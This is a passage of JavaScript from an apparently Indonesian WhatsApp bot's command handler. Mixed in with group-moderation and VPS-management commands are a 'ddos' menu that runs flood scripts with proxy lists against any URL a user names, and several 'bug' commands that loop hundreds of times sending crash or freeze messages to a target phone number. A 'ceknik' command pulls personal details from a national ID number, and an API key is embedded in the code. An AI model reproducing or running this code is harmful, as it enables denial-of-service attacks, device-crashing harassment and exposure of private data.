await cay.groupSettingUpdate(m.chat, 'not_announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {

if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isOwner) return reply(msg.owner)
await cay.groupSettingUpdate(m.chat, 'announcement')
m.reply("Berhasil Mengganti Setelan Grup Menjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
/*case "del": case "delete": {
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return reply(msg.adminbot)
cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break*/
case "del": case "delete": {

if (isGroup) {
if (!isOwner && !isAdmin && !isPremium) return reply(msg.admin)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return reply(msg.adminbot)
cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
cay.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case 'inpogempa':
case 'infogempa':{
m.reply(`_Waitt... sedang mencari Informasi gempa di Indonesia_`)
await sleep(4000)
	let data = await fetchJson(`https://api.maulanaa.xyz/lana/infogempa?apikey=cs_2AtCW`)
	
	let jsn =`*INFORMASI GEMPA*\n\n
	- Waktu: ${data.result.Waktu}
	- Lintang: ${data.result.Lintang}
	- Bujur: ${data.result.Bujur}
	- Magnitudo: ${data.result.Magnitudo}
	- Kedalaman: ${data.result.Kedalaman}
	- Wilayah: ${data.result.Wilayah}`
	
	await cay.sendMessage(m.chat, {image: {url: data.result.Map}, caption: jsn})
	 }
	 break
//cek nik
case 'ceknik':{
if (!q) return reply(`*Example:* ${prefix + command} Nik ktp`)
let ana = await fetchJson(`https://api.maulanaa.xyz/tools/ceknik?apikey=cs_2AtCW&text=${q}`)
let caption = `Status: *${ana.status}*
Pesan : ${ana.pesan}

Nik : *${ana.data.nik}*
Kelamin : *${ana.data.kelamin}*
Lahir : *${ana.data.lahir}*
Provinsi : *${ana.data.provinsi}*
Kota/Kabupaten : *${ana.data.kotakab}*
Kecamatan : *${ana.data.kecamatan}*
Uniqcode : *${ana.data.uniqcode}*
Kodepos : *${ana.data.tambahan.kodepos}*
Pasaran : *${ana.data.tambahan.pasaran}*
Umur : *${ana.data.tambahan.usia}*
Ultah : *${ana.data.tambahan.ultah}*
Zodiak : *${ana.data.tambahan.zodiak}*`

cay.sendMessage(m.chat, { text: caption},{quoted:m})
}
break
case "demote": case "demote": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.owner)
if (!isBotAdmin) return reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await cay.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => m.reply(`Berhasil Memberhentikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "promote": case "promot": {
if (!isGroup) return reply(msg.group)
if (!isOwner && !isAdmin) return reply(msg.owner)
if (!isBotAdmin) return reply(msg.adminbot)
if (m.quoted || text) {
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await cay.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => m.reply(`Berhasil Menjadikan ${target.split("@")[0]} Sebagai Admin Grup Ini`)).catch((err) => m.reply(err.toString()))
} else return m.reply(example('62838XXX'))}
break
case "owner": {
cay.sendContact(m.chat, [owner], `owner bot ${global.namabot}`, null, {contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true, 
thumbnail: await fs.readFileSync("./media/Menu.jpg"), 
title: `© Copyright ${global.namaowner}`, 
renderLargerThumbnail: true, 
sourceUrl: global.saluran, 
mediaType: 1
}}})
await cay.sendMessage(m.chat, {
                        audio: fs.readFileSync('./media/ownerku.mp3'),
                        mimetype: 'audio/mpeg',
                        ptt: true
                    }, {
                        quoted: qtext2
                    })
}
break
case 'kickall': {
 if (!m.isGroup) return m.reply('Fitur Khusus Group!')
 if (!isCreator) return m.reply('Fitur Khusus Owner & Admin!')
 if (!isBotAdmin) return m.reply('Saya Bukan Admin grup!')
  const kickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of kickall) {
 await cay.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(3000);
 }
 m.reply(`Success`);
}
break
case "ambilq": {
let jsonData = JSON.stringify({ [m.quoted.mtype]: m.quoted }, null, 2)
reply(jsonData)
}

case 'autoai':{
cay.CAI = cay.CAI ? cay.CAI : {};

    if (!text) return reply(`*Contoh:* .autoai *[on/off]*`);

    if (text === "on") {
        cay.CAI[sender] = {
            messages: []
        };
        m.reply(`[ ✓ ] ᴀᴜᴛᴏ ᴀɪ ʙᴏᴛ *\`Hutao\`* : ᴀᴋᴛɪғ [ √ ]`);
    } else if (text === "off") {
        delete cay.CAI[sender];
        m.reply(`[ ✓ ] ᴀᴜᴛᴏ ᴀɪ *\`Hutao\`* : ɴᴏɴᴀᴋᴛɪғ [ √ ]`);
    }
};
break
case "public": case "publik": {
if (!isOwner) return reply(msg.owner)
cay.public = true
reply("berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {
if (!isOwner) return reply(msg.owner)
cay.public = false
reply("Berhasil mengganti mode bot menjadi *Self*")
}
break
case 'ddos':
    if (!isCreator) {
        if (args.length >= 2) {
            const target = args[0];
            const duration = parseInt(args[1]);

            if (isNaN(duration) || duration <= 0) {
                reply("Invalid duration. Please enter a valid number.");
                break;
            }

            const userTimelimit = isOwner ? Infinity : (database[sender]?.timelimit || 0);
            if (duration > userTimelimit) {
                reply(`The specified duration (${duration} seconds) exceeds your time limit of ${userTimelimit} seconds.`);
                break;
            }

            const msgii = await generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessageV2Extension: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.fromObject({
                                    text: `HutaoMd V1.9`
                                }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards: [
                                        {
                                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                                title: `
々 _*TARGET ${target}*_
々 _*DURATION : ${duration}*_
*Select First The Type Ddos! !*
ぎ Join My Group Chat ! t.me/caywzzneh
`,
                                                hasMediaAttachment: true,
                                                ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/1w03u4.jpg' } }, { upload: cay.waUploadToServer }))
                                            }),
                                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                                buttons: [
                                                    {
                                                        name: "single_select",
                                                        buttonParamsJson: `{ "title": "Select DDOS Method", "sections": [{ "title": "# Choose One Below", "highlight_label": "Powered by Caywzz", "rows": [
                                                            { "header": "Method Kill", "title": "🔴 KILL", "id": ".ddos_method ${target} ${duration} kill" },
                                                            { "header": "Method Strike", "title": "⚡ STRIKE", "id": ".ddos_method ${target} ${duration} strike" },
                                                            { "header": "Method Bypass", "title": "🔓 BYPASS", "id": ".ddos_method ${target} ${duration} bypass" },
                                                            { "header": "Method TLS", "title": "🔐 TLS", "id": ".ddos_method ${target} ${duration} tls" },
                                                            { "header": "Method Ninja", "title": "💨 NINJA", "id": ".ddos_method ${target} ${duration} ninja" },
                                                            { "header": "Method Mix", "title": "🌪️ MIX", "id": ".ddos_method ${target} ${duration} mix" },
                                                            { "header": "Method Raw", "title": "🔥 RAW", "id": ".ddos_method ${target} ${duration} raw" }
                                                        ]}]}`
                                                    },
                                                    {
                                                        name: "cta_url",
                                                        buttonParamsJson: `{\"display_text\":\"Group Telegram\",\"url\":\"https://t.me/caywzzneh\",\"merchant_url\":\"https://t.me/caywzzneh\"}`
                                                    }
                                                ]
                                            })
                                        }
                                    ]
                                })
                            })
                        }
                    }
                },
                { userJid: m.sender, quoted: qkontak }
            );

            
    await cay.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
        } else {
            reply("Example: .ddos https://google.com 120");
        }
    } else {
        reply("You Don't Have Access To This Command");
    }
    break;

case 'ddos_method':
    if (!isCreator) {
        if (args.length >= 3) {
            const target = args[0];
            const duration = parseInt(args[1]);
            const methods = args[2];

            const execCommand = (script) => {
                exec(script, (err) => {
                    if (err) {
                        reply(`Error executing the attack: ${err.message}`);
                    }
                });
            };

            switch (methods) {
                case 'kill':
                    execCommand(`node ./lib/PermenMD/StarsXKill.js ${target} ${duration} 100 10`);
                    break;
                case 'strike':
                    execCommand(`node ./lib/PermenMD/StarsXStrike.js GET ${target} ${duration} 10 90 proxy.txt --full`);
                    break;
                case 'bypass':
                    execCommand(`node ./lib/PermenMD/StarsXBypass.js ${target} ${duration} 100 10 proxy.txt`);
                    break;
                case 'tls':
                    execCommand(`node ./lib/PermenMD/StarsXTls.js ${target} ${duration} 100 10`);
                    break;
                case 'ninja':
                    execCommand(`node ./lib/PermenMD/StarsXNinja.js ${target} ${duration}`);
                    break;
                case 'mix':
                    execCommand(`node ./lib/PermenMD/StarsXMix.js ${target} ${duration} 100 10 proxy.txt`);
                    break;
                case 'raw':
                    execCommand(`node ./lib/PermenMD/StarsXRaw.js ${target} ${duration}`);
                    break;
                default:
                    reply("Invalid method specified.");
                    break;
            }
            reply(`Attack Sent:\nTarget: ${target}\nDuration: ${duration}s\nMethod: ${methods}`);
        } else {
            reply("Invalid usage. Example: .ddos_method https://google.com 120 kill");
        }
    } else {
        reply("You Don't Have Access To This Command");
    }
    break;
// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- ///    
 case 'bugspam': {
if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 100; i++) {
    await locasifreeze2(nomor, ptcp = true)
     await BlankScreen(nomor, ptcp = true)
      await locasifreeze(nomor, ptcp = true)
      await freezefile(nomor, ptcp = true)
     }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }
        break
      case 'bugui': {
if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 100; i++) {
    await locasifreeze2(nomor, ptcp = true)
     }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }
        break
              case 'bugfreeze': {
      if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 100; i++) {
    await TdX(nomor, ptcp = true)
     }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }
        break
          case 'bug3': {
if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 100; i++) {
    await BlankScreen(nomor, ptcp = true)
        await GlX(nomor, ptcp = true)
     }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }
        break
        
             case 'bugblank': {
     if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 100; i++) {
    await BlankScreen(nomor, ptcp = true)
     }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }
        break
 case 'bugcaywzz': {
if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 100; i++) {
         await freezefile(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
      case 'xc': {
  try {
    if (!isCreator) return reply(`*khusus Owner*`);
    
    let audioFile = './image/music2.mp3'; // Ganti sesuai lokasi file audio
    let nomor = text.split(",")[0].trim(); // Menghapus spasi yang tidak diperlukan
    let jumlah = parseInt(text.split(",")[1]); // Mengonversi jumlah ke integer

    if (!jumlah) {
      return reply(`Gunakan ${prefix + command} nomor\nContoh: ${prefix + command} 62xxxxxxxxxx,5`);
    }

    await cay.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    const msgii = await generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessageV2Extension: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: "Hutao V1.8\n> © Caywzz"
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: [
                  {
                    body: proto.Message.InteractiveMessage.Body.fromObject({}),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({}),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                      title: `
々 _*TARGET @${nomor}*_
々 _*Type Bug : ??*_
々 _*Jumlah : ${jumlah}*_
*Select First The Type Bug !*
ぎ Join My Group Chat ! t.me/caywzzneh
                      `,
                      hasMediaAttachment: true,
                      ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/1w03u4.jpg'} }, { upload: cay.waUploadToServer }))
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                      buttons: [
                        {
"name": "single_select",
"buttonParamsJson": `{ "title": "Pilih Bug!", "sections": [{ "title": "# Silahkan Pilih Salah Satu Di Bawah Ini", "highlight_label": \"Powered By Cay\", "rows": [{ "header": "BugCaywzz", "title": " ⛩️ B U G F R E E Z E 🥶", "id": ".bugcaywzz ${nomor},${jumlah}" }, 
{ "header": "BugUi", "title": " ⛩️ F L O O D U I 🦠", "id": ".bugui ${nomor},${jumlah}" }, 
{ "header": "BugSpam", "title": " ⛩️ B U G S P A M 👋", "id": ".bugspam ${nomor},30" }, 
{ "header": "BugBlank", "title": " ⛩️ B U G B L A N K 🔥", "id": ".bugblank ${nomor},${jumlah}" }, 
{ "header": "BugDokumen1", "title": " ⛩️ B U G D O K U 1 🎉", "id": ".bugfreeze ${nomor},${jumlah}" }, 
{ "header": "BugDoku", "title": " ⛩️ B U G D O K U 📑", "id": ".bugdoku ${nomor},${jumlah}" }, 
{ "header": "BugIos", "title": " ⛩️ B U G I O S ❄️", "id": ".bugios ${nomor},${jumlah}" }]}]}`
},
                        {
                          "name": "cta_url",
                          "buttonParamsJson": `{\"display_text\":\"Group Telegram\",\"url\":\"https://t.me/caywzzneh\",\"merchant_url\":\"https://t.me/caywzzneh\"}`
                        }
                      ]
                    })
                  }
                ]
              })
            })
          }
        }
      },
      { userJid: m.sender, quoted: qkontak }
    );

    await cay.relayMessage(m.chat, msgii.message, { messageId: msgii.key.id });
    await cay.sendMessage(m.chat, {
      audio: { url: audioFile },
      mimetype: 'audio/mpeg'
    }, { quoted: msgii });
    /*await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
    reply(`*</> Berhasil mengirimkan bug *${command}* dengan jumlah *${jumlah}*`);*/
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
    reply("Maaf, terjadi kesalahan saat menjalankan perintah.");
  }
}
break
        case 'bugdoku': {
    if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 100; i++) {
         await freezefile(nomor, ptcp = true)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
       case 'bugios': {
     if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 500; i++) {
         await TxIos(nomor, ptcp = true)
         await ziosX4(nomor)
         await ziosX3(nomor)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
           case 'bugiosinvis': {
if (!isCreator) return reply("Owner only")
if (!q) return reply(`Use like .${command} 23470809685xx`)
let qted = q.replace(/[^0-9]/g, "")
if (qted.startsWith('0')) return reply(` Number must be in international format like 2347080968564`)
let nomor = qted + '@s.whatsapp.net'
        for (let i = 0; i < 500; i++) {
         await xeonIOSINVI3(nomor)
         await ziosX4(nomor)
         await ziosX3(nomor)
      }
        await cay.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
        reply(`*</> Successfully submitted the bug *${command}* Amount *${jumlah}*`);
      }     
       break
             case 'deletebug': {
        if (!isCreator) return reply(`*khusus Owner*`);
        if (!args[0]) return reply(`Use ${prefix + command} number\nExample ${prefix + command} 62xxxxxxxxxx \n © Caywzz`);
        let sidianya = text + '@s.whatsapp.net';
        await cay.sendMessage(sidianya, { text: penangkalnya, contextInfo: { isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `CaywZUwu`, serverMessageId: 2 } } }, { quoted: fkontak });
        reply(`Sukses Mengirim Penangkal/Anti Bug Ke ${sidianya}\n © Caywzz`);
      }
        break
        case 'listdroplet': {
if (!isCreator) return reply(`Khusus Owner`)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.token_do
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
cay.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break
case 'sendvps': {
if (!isCreator) return m.reply("Khusus Owner")
if (!text) return m.reply(`Contoh: ${prefix+command} 628xxx,ip,ram,harga,password`)
reply("*Pesanan Terkirim 📦!") 
var mon = args.join(' ')
var m1 = mon.split(",")[0]
var m2 = mon.split(",")[1]
var m3 = mon.split(",")[2]
var m4 = mon.split(",")[3]
var m5 = mon.split(",")[4]
let dex1 = m1 + '@s.whatsapp.net'
let rajanye = global.owner + '@s.whatsapp.net'
let gue = m.sender
let ments = [dex1, rajanye, gue]
rafatharcode.sendMessage(mq1, {text: `
*📦 PESANAN MU DATANG 📦*
Harga: ${m4}
Username: Root
Password: ${m5}
Ram: ${m3}

*°•——————  TOS VPS  ——————•°*
- Jangan Dipakai Untuk DDoS 
- Jangan Dipakai Untuk Tunneling
- Batas CPU 120%
Melanggar? garansi hangus & no reff! `}, m) 
}
break
case 'restartvps': {
if (!isCreator) return reply(`Khusus Owner`)
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.token_do}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

case 'rebuild': {
if (!isCreator) return reply(`Khusus Owner`)
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.token_do}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.token_do}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
cay.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

case "sisadroplet": {
if (!isCreator) return reply(`Khusus Owner`)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.token_do}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.token_do}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return reply(`Khusus Owner`)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

case "deldroplet": {
if (!isCreator) return reply(`Khusus Owner`)
if (!text) return m.reply(`Example : *.${command}* iddroplet`)
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${global.token_do}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.token_do}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

case "r1c1": case "r2c1": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return reply(`Khusus Owner`)
if (!text) return m.reply(`Example : *.${command}* hostname`)
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "syd1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(`Example : *.${command}* hostname`)
    function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

    try {        
        let dropletData = {
            name: hostname,
            region: region,
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        const password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.token_do 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.token_do
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat! 🛍️\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await cay.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break
   case 'Hutao': {
const ditsganteng = "https://cih-cai-jir.koi.pics/newchat?id=_XjlY1xn-xKyZ453zDa2boJ51fMfO3oV6qyTvds9BSM";
let y = await fetchJson(ditsganteng);
cay.sendMessage(m.chat, {text: y.status}, {quoted:qkontak})
}
break

case 'Hutao-ai':{
cay.asuma = cay.asuma ? cay.asuma : {};

    if (!text) return reply(`*Contoh:* .autoai *[on/off]*`);

    if (text === "on") {
        cay.asuma[sender] = {
            messages: []
        };
        m.reply(`[ ✓ ] ᴀᴜᴛᴏ ᴀɪ *\`asumaa\`* : ᴀᴋᴛɪғ [ √ ]`);
    } else if (text === "off") {
        delete cay.asuma[sender];
